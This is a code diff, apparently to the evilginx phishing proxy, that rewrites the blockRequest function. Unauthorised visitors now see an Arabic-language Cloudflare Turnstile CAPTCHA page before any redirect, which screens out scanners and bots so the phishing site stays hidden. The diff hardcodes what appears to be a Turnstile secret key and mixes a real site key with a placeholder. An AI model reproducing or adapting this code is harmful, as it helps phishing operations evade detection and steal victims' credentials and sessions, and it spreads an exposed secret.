@@ -1367,23 +1367,208 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
-	var redirect_url string
-	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
-		redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
-	}
-	if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
-		redirect_url = p.cfg.general.UnauthUrl
-	}
-
-	if redirect_url != "" {
-		return p.javascriptRedirect(req, redirect_url)
-	} else {
-		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
-		if resp != nil {
-			return req, resp
+	// التحقق من وجود كوكي CAPTCHA
+	captcha_cookie, err := req.Cookie("passed_captcha")
+	if err == nil && captcha_cookie.Value == "1" {
+		// المستخدم اجتاز الكابتشا، نتابع الطلب
+		if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
+			redirect_url := p.cfg.PhishletConfig(pl.Name).UnauthUrl
+			if redirect_url != "" {
+				return p.javascriptRedirect(req, redirect_url)
+			}
 		}
 	}
-	return req, nil
+	
+	// التحقق مما إذا كان هذا طلب POST لتحقق الكابتشا
+	if req.Method == "POST" && req.URL.Path == "/verify_captcha" {
+		err := req.ParseForm()
+		if err == nil {
+			// التحقق من رمز Turnstile 
+			token := req.FormValue("cf-turnstile-response")
+			if token != "" {
+				// بناء طلب للتحقق من الكابتشا
+				client := &http.Client{Timeout: 10 * time.Second}
+				
+				verification_data := url.Values{}
+				verification_data.Set("secret", "0x4AAAAAABawvOUzgPpoLNJmrzMwBAxJ9_Q")
+				verification_data.Set("response", token)
+				verification_data.Set("remoteip", strings.SplitN(req.RemoteAddr, ":", 2)[0])
+				
+				verification_resp, err := client.PostForm("https://challenges.cloudflare.com/turnstile/v0/siteverify", verification_data)
+				if err == nil {
+					defer verification_resp.Body.Close()
+					var result map[string]interface{}
+					if err := json.NewDecoder(verification_resp.Body).Decode(&result); err == nil {
+						if success, ok := result["success"].(bool); ok && success {
+							// نجح التحقق، وضع الكوكي وإعادة التوجيه
+							resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+							if resp != nil {
+								expiration := time.Now().Add(24 * time.Hour)
+								cookie := http.Cookie{Name: "passed_captcha", Value: "1", Expires: expiration, Path: "/"}
+								resp.Header.Set("Set-Cookie", cookie.String())
+								resp.Header.Set("Location", req.Referer())
+								return req, resp
+							}
+						}
+					}
+				}
+			}
+		}
+		// في حالة الفشل، عرض صفحة الكابتشا مرة أخرى مع رسالة خطأ
+		captchaHTML := `<!DOCTYPE html>
+<html dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق الأمني</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+        h1 {
+            color: #e53935;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #555;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        .captcha-container {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        button {
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #3367d6;
+        }
+        .error {
+            color: #e53935;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>تحذير أمني</h1>
+        <p>للاستمرار إلى هذا الموقع، يرجى إكمال فحص الأمان أدناه للتأكد من أنك لست روبوتًا.</p>
+        <div class="error">تعذر التحقق، يرجى المحاولة مرة أخرى</div>
+        <form action="/verify_captcha" method="POST">
+            <div class="captcha-container">
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light"></div>
+            </div>
+            <button type="submit">تحقق والمتابعة</button>
+        </form>
+    </div>
+</body>
+</html>`
+		
+		resp := goproxy.NewResponse(req, "text/html", http.StatusOK, captchaHTML)
+		return req, resp
+	}
+	
+	// عرض صفحة الكابتشا
+	captchaHTML := `<!DOCTYPE html>
+<html dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق الأمني</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+        h1 {
+            color: #e53935;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #555;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        .captcha-container {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        button {
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #3367d6;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>تحذير أمني</h1>
+        <p>للاستمرار إلى هذا الموقع، يرجى إكمال فحص الأمان أدناه للتأكد من أنك لست روبوتًا.</p>
+        <form action="/verify_captcha" method="POST">
+            <div class="captcha-container">
+                <div class="cf-turnstile" data-sitekey="YOUR_SITE_KEY" data-theme="light"></div>
+            </div>
+            <button type="submit">تحقق والمتابعة</button>
+        </form>
+    </div>
+</body>
+</html>`
+	
+	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, captchaHTML)
+	return req, resp
 }
 
 func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
